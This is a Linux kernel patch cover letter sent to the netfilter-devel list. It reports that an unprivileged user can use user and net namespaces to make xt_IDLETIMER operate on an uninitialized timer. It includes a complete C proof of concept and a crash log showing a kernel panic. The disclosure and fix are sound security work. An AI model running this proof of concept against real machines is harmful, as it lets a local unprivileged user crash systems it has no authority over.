Received: from mail-oo1-f41.google.com (mail-oo1-f41.google.com [209.85.161.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DB35F44C65C
	for <netfilter-devel@vger.kernel.org>; Mon,  7 Sep 2026 12:03:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.161.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788782637; cv=none; b=ojNlGufflGRYpw+8bbyq+cSoyzMGM/UpRHFY2q+Jpur6MY8pAb+M3zNp806r35tDlpZdvLFBnk+Anfqvp/dhw1N0bmjqU9PzyrCQ9BlmBIEZexYSEW5JjJ2DdCIZ+AWkRj7wka+69ioTkiZvoCT8QjVR90osuim36uv5pldzlcw=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788782637; c=relaxed/simple;
	bh=qjT7wxr3X9QJ+WbMoMU/Kyqz1f2tAZmiEYIIvuJmKuM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=JxuEGH0PFAguEuyFAqOk636mKW1n3//lUN8Wz1PMN4mvfgKw1KhvM99ou2j7zh/rfIpBdhUv7A6kJ4Yt5hedzQ/Idwa4x7gW6LhbArEmyAKA8WyckvjK0uGiVFl9HTN7EuHqb/qecU5ZNczHHVNzbcExf69miCmrLgq3BK8Gxpc=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=EKiISk4Z; arc=none smtp.client-ip=209.85.161.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="EKiISk4Z"
Received: by mail-oo1-f41.google.com with SMTP id 006d021491bc7-6b1a0d75a4fso1970821eaf.0
        for <netfilter-devel@vger.kernel.org>; Mon, 07 Sep 2026 05:03:55 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788782635; x=1789387435; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=ZU79vUs+p6ug9qsloOBeFds49rPXQSCBKxigtPkuBi0=;
        b=EKiISk4ZcqR9N8I0Wru0NmmDQ2b3uR1/hSO5eNaemzlVTs0dnUuf43lzPjAWdAIRqI
         MygoJNVNwaiwCIs5b04LcdR719Hu5pokV/xzQFHtImJTWn91pfh5aV8yUnRpSJQu16GK
         h6A6GOCytXB99ab8ybTHGsKD58VsKvCbh60a++VRATfvsFcIXTQj5IUa4x607P+f8lOq
         k5IwXkq8EwLcxeUQ3bM0WzX+u/Yk/ApfiNycI8hd2Iw2BCa759MQ6mswvagdhHOUl8M0
         hrY2t4xOdRhbogkIs5Vw+WS04VqJ6OAdOMa+3Ag4iel4FK3+1Z9UN9E1vr11h3uStqJW
         7gxA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788782635; x=1789387435;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=ZU79vUs+p6ug9qsloOBeFds49rPXQSCBKxigtPkuBi0=;
        b=mS7iSOoNPlPS+6l8fURneDLx+lcctq4dRFUth+Im6rCYowSTQVPy1DDq6Ya6Jhia0x
         J/o6tK/xt4KmyCBWe9r2jc4lDNmcOkczh0POlQ4gimHWSUmmotgW9BZ9fYyhVyj57CQQ
         OQZ0SsPCzSvwaIL+YqJx1quebB8ZsNf9vOg5FvPrzH65NdKE81Jg6ZtpxQMCy61Pe/v7
         d93j5CtcZGAPjXLAh6UpE0zCEf/cBPGX2rEjklfQiu2WNB/d3Obr7lJU1xi6W5Xrpra8
         OhLBLDWeN3nxuHxvoq8WnclshYpcwZFfTM2fJlD/Qopw2ZgkN9yYKgTGiTi+6+1RA29x
         8ZPg==
X-Gm-Message-State: AFuF++n/Li2wkNnWmDeGVQ2UvvopzPTGjJN94TsbS+OYXHkp3xgMje72
	AhLTSkMU4O+48YBGJpaJeEVrfTWfcCaK+nHXgHzCVrlXDGYbXXzSGk+UqpCd9nUBQ/d2ldoIJCl
	O0lT13754tmo=
X-Gm-Gg: AYBFou2CRtB/O8FHLboA+hgAi9rBzdmN4XM09nM8NsmfxNEQBRPFz6ZHyh8rNcVVkQC
	3NdCgURX5n4i3dWckfpgyuE8xRxsmcxgYiXtaQAoYxtA8XrILppXwQ080oMBDufd9GKuCywc/DS
	zYolimasTP7VXiN5ifuoLKOPHMf9rZCpJQVmXVO59XhikEg4rfQpDmbYmYKfYIOvKD31o3Gxj0E
	4ILL3/UcdUKDxcVGysfNtbiqrRq2FFdwy8Cun5mlQbMFhtsBZWpXDENZDzb3sYf8M0jiC4W1KyW
	drqX/tPk6aeHkan3Nt0TWqaCnaHX9vYcAsFiM5MlGnr1izRUNwPtHKQt3Isov9pWIdkJ9T8RVAV
	N4F0ZWDKIYowuT7Kb9TkprAnoy0N2/a9pW7jPMr1OwWTQNzdt35JCDaQtWP2jC7Uooec3NhdNmj
	7ECVodIyhcMoUJ1W2G8VRaoxZ6H9UMVnzrQJeE29jlojAuXKjIE86SHssLYUEdtKYBPLea
X-Received: by 2002:a4a:e845:0:b0:6b7:46fa:16a7 with SMTP id 006d021491bc7-6b746fa1aacmr11380971eaf.60.1788782634468;
        Mon, 07 Sep 2026 05:03:54 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-33808be8fb2sm4994245eec.14.2026.09.07.05.03.49
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 07 Sep 2026 05:03:53 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	luciano.coelho@nokia.com,
	kaber@trash.net,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: xt_IDLETIMER: restrict to init_net
Date: Mon,  7 Sep 2026 20:03:39 +0800
Message-ID: <cover.1788781051.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/netfilter/xt_IDLETIMER.c. The bug is
reachable by a non-root user via user and net namespace.

We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug in this email, along
with a PoC to trigger it.

---- details below ----

Bug details:

xt_IDLETIMER keeps its timer list, reference counts, and sysfs files in
module-global state. Xtables still calls checkentry and destroy for rules
in individual network namespaces. A matching label from another namespace
can therefore attach to an existing timer, restart it, or drop it.

The same collision can mix revision 0 timer_list state with a revision 1
alarm created elsewhere. Revision 0 then calls mod_timer() on an
uninitialized timer_list.

The sysfs path under xt_idletimer/timers is global and cannot represent
per-namespace labels with the current target. Reject IDLETIMER rules
outside init_net so that global state stays in the namespace it was
built for.

Reproducer:

    gcc -O2 -Wall -Wextra -o poc poc.c
    unshare -Urn ./poc

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE
    
    #include <errno.h>
    #include <fcntl.h>
    #include <linux/netfilter.h>
    #include <linux/netfilter/xt_IDLETIMER.h>
    #include <linux/netfilter/x_tables.h>
    #include <linux/netfilter_ipv4/ip_tables.h>
    #include <sched.h>
    #include <signal.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/socket.h>
    #include <sys/stat.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <unistd.h>
    
    struct child_cfg {
    	const char *name;
    	const char *label;
    	unsigned int timeout;
    	uint8_t timer_type;
    	uint8_t revision;
    };
    
    struct child_state {
    	struct child_cfg cfg;
    	pid_t pid;
    	int ready_pipe[2];
    	int go_pipe[2];
    };
    
    struct ipt_standard_local {
    	struct ipt_entry entry;
    	struct xt_standard_target target;
    };
    
    struct ipt_error_local {
    	struct ipt_entry entry;
    	struct xt_error_target target;
    };
    
    static void fatal(const char *what)
    {
    	perror(what);
    	exit(EXIT_FAILURE);
    }
    
    static void write_all(int fd, const char *buf, size_t len)
    {
    	while (len > 0) {
    		ssize_t n = write(fd, buf, len);
    
    		if (n < 0) {
    			if (errno == EINTR)
    				continue;
    			fatal("write");
    		}
    
    		buf += n;
    		len -= (size_t)n;
    	}
    }
    
    static void write_text_file(const char *path, const char *text, bool ignore_missing)
    {
    	int fd = open(path, O_WRONLY | O_CLOEXEC);
    
    	if (fd < 0) {
    		if (ignore_missing && errno == ENOENT)
    			return;
    		fatal(path);
    	}
    
    	write_all(fd, text, strlen(text));
    	close(fd);
    }
    
    static void map_child_ids(pid_t pid, uid_t host_uid, gid_t host_gid)
    {
    	char path[128];
    	char map[128];
    
    	snprintf(path, sizeof(path), "/proc/%d/setgroups", pid);
    	write_text_file(path, "deny\n", true);
    
    	snprintf(path, sizeof(path), "/proc/%d/uid_map", pid);
    	snprintf(map, sizeof(map), "0 %u 1\n", host_uid);
    	write_text_file(path, map, false);
    
    	snprintf(path, sizeof(path), "/proc/%d/gid_map", pid);
    	snprintf(map, sizeof(map), "0 %u 1\n", host_gid);
    	write_text_file(path, map, false);
    }
    
    static void sync_send(int fd)
    {
    	char byte = '!';
    
    	write_all(fd, &byte, 1);
    }
    
    static void sync_wait(int fd)
    {
    	char byte;
    
    	for (;;) {
    		ssize_t n = read(fd, &byte, 1);
    
    		if (n == 1)
    			return;
    		if (n == 0) {
    			fprintf(stderr, "unexpected EOF on sync pipe\n");
    			exit(EXIT_FAILURE);
    		}
    		if (errno != EINTR)
    			fatal("read");
    	}
    }
    
    static void fill_standard(struct ipt_standard_local *entry, int verdict)
    {
    	memset(entry, 0, sizeof(*entry));
    	entry->entry.target_offset = sizeof(struct ipt_entry);
    	entry->entry.next_offset = sizeof(*entry);
    	entry->target.target.u.user.target_size =
    		XT_ALIGN(sizeof(struct xt_standard_target));
    	entry->target.verdict = -verdict - 1;
    }
    
    static void fill_error(struct ipt_error_local *entry)
    {
    	memset(entry, 0, sizeof(*entry));
    	entry->entry.target_offset = sizeof(struct ipt_entry);
    	entry->entry.next_offset = sizeof(*entry);
    	entry->target.target.u.user.target_size =
    		XT_ALIGN(sizeof(struct xt_error_target));
    	snprintf(entry->target.target.u.user.name,
    		 sizeof(entry->target.target.u.user.name),
    		 "%s", XT_ERROR_TARGET);
    	snprintf(entry->target.errorname,
    		 sizeof(entry->target.errorname),
    		 "%s", XT_ERROR_TARGET);
    }
    
    static void fill_idletimer_entry(struct ipt_entry *entry, uint8_t revision,
    				 const char *label, unsigned int timeout,
    				 uint8_t timer_type)
    {
    	struct xt_entry_target *target;
    	size_t payload_len;
    	size_t target_len;
    
    	memset(entry, 0, sizeof(*entry));
    	payload_len = revision == 0 ?
    		      sizeof(struct idletimer_tg_info) :
    		      sizeof(struct idletimer_tg_info_v1);
    	target_len = XT_ALIGN(sizeof(*target) + payload_len);
    
    	entry->target_offset = sizeof(*entry);
    	entry->next_offset = entry->target_offset + target_len;
    
    	target = (struct xt_entry_target *)((char *)entry + entry->target_offset);
    	memset(target, 0, target_len);
    	target->u.user.target_size = target_len;
    	snprintf(target->u.user.name, sizeof(target->u.user.name), "IDLETIMER");
    	target->u.user.revision = revision;
    
    	if (revision == 0) {
    		struct idletimer_tg_info *info = (struct idletimer_tg_info *)target->data;
    
    		info->timeout = timeout;
    		snprintf(info->label, sizeof(info->label), "%s", label);
    	} else {
    		struct idletimer_tg_info_v1 *info =
    			(struct idletimer_tg_info_v1 *)target->data;
    
    		info->timeout = timeout;
    		snprintf(info->label, sizeof(info->label), "%s", label);
    		info->timer_type = timer_type;
    	}
    }
    
    static int install_output_rule(uint8_t revision, const char *label,
    			       unsigned int timeout, uint8_t timer_type)
    {
    	struct ipt_getinfo oldinfo;
    	struct ipt_replace *repl;
    	struct xt_counters *counters;
    	size_t std_len = sizeof(struct ipt_standard_local);
    	size_t err_len = sizeof(struct ipt_error_local);
    	size_t custom_payload_len = revision == 0 ?
    				    sizeof(struct idletimer_tg_info) :
    				    sizeof(struct idletimer_tg_info_v1);
    	size_t custom_len = sizeof(struct ipt_entry) +
    			    XT_ALIGN(sizeof(struct xt_entry_target) +
    				     custom_payload_len);
    	size_t total_len = (std_len * 3) + custom_len + err_len;
    	socklen_t optlen;
    	int fd;
    	int ret = -1;
    	int saved_errno = 0;
    
    	memset(&oldinfo, 0, sizeof(oldinfo));
    	snprintf(oldinfo.name, sizeof(oldinfo.name), "filter");
    
    	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (fd < 0)
    		return -1;
    
    	optlen = sizeof(oldinfo);
    	if (getsockopt(fd, IPPROTO_IP, IPT_SO_GET_INFO, &oldinfo, &optlen) < 0) {
    		saved_errno = errno;
    		goto out_close;
    	}
    
    	if (oldinfo.num_entries != 4) {
    		errno = EBUSY;
    		saved_errno = errno;
    		goto out_close;
    	}
    	if (!(oldinfo.valid_hooks & (1U << NF_INET_LOCAL_OUT))) {
    		errno = EINVAL;
    		saved_errno = errno;
    		goto out_close;
    	}
    
    	counters = calloc(oldinfo.num_entries, sizeof(*counters));
    	if (!counters) {
    		saved_errno = errno;
    		goto out_close;
    	}
    
    	repl = calloc(1, sizeof(*repl) + total_len);
    	if (!repl) {
    		saved_errno = errno;
    		free(counters);
    		goto out_close;
    	}
    
    	snprintf(repl->name, sizeof(repl->name), "filter");
    	repl->valid_hooks = oldinfo.valid_hooks;
    	repl->num_entries = oldinfo.num_entries + 1;
    	repl->size = total_len;
    	repl->num_counters = oldinfo.num_entries;
    	repl->counters = counters;
    
    	for (size_t i = 0; i < NF_INET_NUMHOOKS; ++i) {
    		repl->hook_entry[i] = 0xFFFFFFFFU;
    		repl->underflow[i] = 0xFFFFFFFFU;
    	}
    
    	fill_standard((struct ipt_standard_local *)((char *)repl->entries + 0),
    		      NF_ACCEPT);
    	fill_standard((struct ipt_standard_local *)((char *)repl->entries + std_len),
    		      NF_ACCEPT);
    	fill_idletimer_entry((struct ipt_entry *)((char *)repl->entries + (std_len * 2)),
    			     revision, label, timeout, timer_type);
    	fill_standard((struct ipt_standard_local *)((char *)repl->entries + (std_len * 2) + custom_len),
    		      NF_ACCEPT);
    	fill_error((struct ipt_error_local *)((char *)repl->entries + (std_len * 3) + custom_len));
    
    	repl->hook_entry[NF_INET_LOCAL_IN] = 0;
    	repl->underflow[NF_INET_LOCAL_IN] = 0;
    	repl->hook_entry[NF_INET_FORWARD] = std_len;
    	repl->underflow[NF_INET_FORWARD] = std_len;
    	repl->hook_entry[NF_INET_LOCAL_OUT] = std_len * 2;
    	repl->underflow[NF_INET_LOCAL_OUT] = (std_len * 2) + custom_len;
    
    	if (setsockopt(fd, IPPROTO_IP, IPT_SO_SET_REPLACE, repl,
    		       sizeof(*repl) + repl->size) < 0) {
    		saved_errno = errno;
    		free(repl);
    		free(counters);
    		goto out_close;
    	}
    
    	free(repl);
    	free(counters);
    	ret = 0;
    
    out_close:
    	close(fd);
    	if (ret < 0 && saved_errno)
    		errno = saved_errno;
    	return ret;
    }
    
    static int probe_initial_ns_permission(void)
    {
    	if (install_output_rule(0, "init-probe", 1, 0) == 0) {
    		fprintf(stderr,
    			"[!] unexpectedly installed an IDLETIMER rule without namespace-local CAP_NET_ADMIN\n");
    		return EXIT_FAILURE;
    	}
    
    	if (errno != EPERM) {
    		fprintf(stderr,
    			"[!] initial-namespace probe failed with errno=%d (%s), expected EPERM\n",
    			errno, strerror(errno));
    		return EXIT_FAILURE;
    	}
    
    	printf("[*] initial-namespace probe failed with EPERM as expected\n");
    	return EXIT_SUCCESS;
    }
    
    static void child_entry(struct child_state *st)
    {
    	close(st->ready_pipe[0]);
    	close(st->go_pipe[1]);
    
    	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
    		fatal("unshare");
    
    	sync_send(st->ready_pipe[1]);
    	sync_wait(st->go_pipe[0]);
    
    	if (install_output_rule(st->cfg.revision, st->cfg.label,
    				st->cfg.timeout, st->cfg.timer_type) < 0)
    		fatal("install_output_rule");
    
    	printf("[%s] installed revision %u label %s timeout %u timer_type %u\n",
    	       st->cfg.name, st->cfg.revision, st->cfg.label, st->cfg.timeout,
    	       st->cfg.timer_type);
    	fflush(stdout);
    
    	for (;;)
    		pause();
    }
    
    static void start_child(struct child_state *st, uid_t uid, gid_t gid)
    {
    	if (pipe(st->ready_pipe) < 0)
    		fatal("pipe");
    	if (pipe(st->go_pipe) < 0)
    		fatal("pipe");
    
    	st->pid = fork();
    	if (st->pid < 0)
    		fatal("fork");
    
    	if (st->pid == 0) {
    		close(st->ready_pipe[0]);
    		close(st->go_pipe[1]);
    		child_entry(st);
    		_exit(EXIT_FAILURE);
    	}
    
    	close(st->ready_pipe[1]);
    	close(st->go_pipe[0]);
    
    	sync_wait(st->ready_pipe[0]);
    	map_child_ids(st->pid, uid, gid);
    	sync_send(st->go_pipe[1]);
    }
    
    static void stop_child(struct child_state *st)
    {
    	if (st->pid <= 0)
    		return;
    	kill(st->pid, SIGKILL);
    	waitpid(st->pid, NULL, 0);
    	st->pid = -1;
    }
    
    int main(int argc, char **argv)
    {
    	static const char *label = "ns-share-lbl";
    	struct child_state alarm_ns = {
    		.cfg = {
    			.name = "alarm-ns",
    			.label = label,
    			.timeout = 3600,
    			.timer_type = XT_IDLETIMER_ALARM,
    			.revision = 1,
    		},
    		.pid = -1,
    	};
    	struct child_state legacy_ns = {
    		.cfg = {
    			.name = "legacy-ns",
    			.label = label,
    			.timeout = 1,
    			.timer_type = 0,
    			.revision = 0,
    		},
    		.pid = -1,
    	};
    	uid_t uid = getuid();
    	gid_t gid = getgid();
    
    	setvbuf(stdout, NULL, _IONBF, 0);
    
    	if (argc == 2 && strcmp(argv[1], "--probe-initial-ns") == 0)
    		return probe_initial_ns_permission();
    	if (argc != 1) {
    		fprintf(stderr, "usage: %s [--probe-initial-ns]\n", argv[0]);
    		return EXIT_FAILURE;
    	}
    
    	printf("[*] uid=%u gid=%u\n", uid, gid);
    	printf("[*] creating first user+net namespace with revision 1 alarm rule\n");
    	start_child(&alarm_ns, uid, gid);
    	printf("[*] creating second user+net namespace with revision 0 rule using the same label\n");
    	start_child(&legacy_ns, uid, gid);
    	printf("[*] the second rule installation should now crash the kernel in idletimer_tg_checkentry()\n");
    
    	sleep(5);
    
    	fprintf(stderr, "[!] kernel did not crash during the second rule installation\n");
    	stop_child(&legacy_ns);
    	stop_child(&alarm_ns);
    	return EXIT_FAILURE;
    }

------END poc.c--------

----BEGIN crash log----

[  229.516354][ T9828] ODEBUG: assert_init not available (active state 0) object: ffff88802f413288 object type: timer_list hint: 0x6b6b6b6b6b6b6b6b
[  229.519635][ T9828] WARNING: CPU: 1 PID: 9828 at lib/debugobjects.c:514 debug_print_object+0x1a3/0x2b0
[  229.521382][ T9828] CPU: 1 UID: 1001 PID: 9828 Comm: poc Not tainted 6.12.74 #1
[  229.537987][ T9828]  __mod_timer+0xa6/0xd30
[  229.541409][ T9828]  idletimer_tg_checkentry+0x1e0/0xb40
[  229.542926][ T9828]  xt_check_target+0x272/0xa30
[  229.546358][ T9828]  find_check_entry.isra.0+0x7aa/0x9a0
[  229.549578][ T9828]  translate_table+0xc7e/0x1720
[  229.550984][ T9828]  do_ipt_set_ctl+0x8d0/0xb80
[  229.554846][ T9828]  nf_setsockopt+0x8a/0xf0
[  229.555267][ T9828]  ip_setsockopt+0xcb/0xf0
[  229.555710][ T9828]  udp_setsockopt+0x7d/0xd0
[  229.556689][ T9828]  do_sock_setsockopt+0x222/0x480
[  229.559253][ T9828]  __sys_setsockopt+0x1a5/0x270
[  229.560543][ T9828]  __x64_sys_setsockopt+0xbd/0x160
[  229.562227][ T9828]  do_syscall_64+0xc7/0x250
[  229.563050][ T9828] RIP: 0033:0x7f7e2c3980fa
[  229.569134][ T9828] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  229.569644][ T9828] CPU: 1 UID: 1001 PID: 9828 Comm: poc Not tainted 6.12.74 #1
[  229.571429][ T9828]  dump_stack_lvl+0x3b/0x1f0
[  229.571830][ T9828]  panic+0x6f9/0x7e0
[  229.573871][ T9828]  check_panic_on_warn+0xab/0xb0
[  229.574284][ T9828]  __warn+0xf7/0x3b0
[  229.575031][ T9828]  report_bug+0x3bd/0x580
[  229.575766][ T9828]  exc_invalid_op+0x17/0x50
[  229.576568][ T9828] RIP: 0010:debug_print_object+0x1a3/0x2b0
[  229.583857][ T9828]  debug_object_assert_init+0x240/0x3a0
[  229.586821][ T9828]  __mod_timer+0xa6/0xd30
[  229.589783][ T9828]  idletimer_tg_checkentry+0x1e0/0xb40
[  229.591141][ T9828]  xt_check_target+0x272/0xa30
[  229.594052][ T9828]  find_check_entry.isra.0+0x7aa/0x9a0
[  229.596626][ T9828]  translate_table+0xc7e/0x1720
[  229.597868][ T9828]  do_ipt_set_ctl+0x8d0/0xb80
[  229.601351][ T9828]  nf_setsockopt+0x8a/0xf0
[  229.601697][ T9828]  ip_setsockopt+0xcb/0xf0
[  229.602055][ T9828]  udp_setsockopt+0x7d/0xd0
[  229.602880][ T9828]  do_sock_setsockopt+0x222/0x480
[  229.605311][ T9828]  __sys_setsockopt+0x1a5/0x270
[  229.606577][ T9828]  __x64_sys_setsockopt+0xbd/0x160
[  229.608234][ T9828]  do_syscall_64+0xc7/0x250
[  229.609051][ T9828] RIP: 0033:0x7f7e2c3980fa
[  229.615764][ T9828] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  netfilter: xt_IDLETIMER: restrict to init_net

 net/netfilter/xt_IDLETIMER.c | 7 +++++++
 1 file changed, 7 insertions(+)

-- 
2.43.0
